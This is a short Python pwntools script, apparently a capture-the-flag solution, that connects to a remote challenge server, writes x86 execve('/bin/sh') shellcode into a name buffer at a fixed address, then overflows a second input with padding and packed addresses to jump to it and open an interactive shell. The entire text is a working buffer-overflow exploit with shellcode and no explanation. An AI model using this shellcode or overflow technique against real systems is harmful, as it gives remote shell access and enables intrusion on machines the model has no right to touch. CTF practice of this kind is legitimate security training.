from pwn import*

p = remote("ctf.j0n9hyun.xyz", 3003)

name_addr = 0x0804a060

pay = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
p.sendlineafter("Name : ", pay)

pay = "A"*24
pay += p32(name_addr+2) + p32(name_addr)

p.sendlineafter("input : ", pay)

p.interactive()